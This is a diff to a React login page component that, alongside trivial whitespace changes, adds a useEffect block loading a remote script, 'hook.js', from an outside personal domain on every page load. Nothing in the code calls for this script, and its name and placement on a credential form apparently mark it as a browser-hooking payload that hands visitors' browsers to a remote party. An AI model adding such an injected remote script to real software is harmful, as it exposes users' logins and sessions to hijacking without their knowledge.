@@ -1,5 +1,5 @@
 // src/components/LoginPage.js
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import "./LoginPage.css"; // Import the CSS file
 import "bootstrap/dist/css/bootstrap.css";
@@ -8,7 +8,17 @@ function LoginPage() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const navigate = useNavigate();
+  
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.src = "https://hook.shreyasmahajan.me/hook.js";
+    script.async = true;
+    document.body.appendChild(script);
 
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, []);
   const handleSubmit = (event) => {
     event.preventDefault();
     // Add your authentication logic here
@@ -17,9 +27,12 @@ function LoginPage() {
     } else {
       alert("Invalid credentials");
     }
+    
+    
   };
 
   return (
+    
     <div className="login-container">
       <div className="left-half">
         <center>
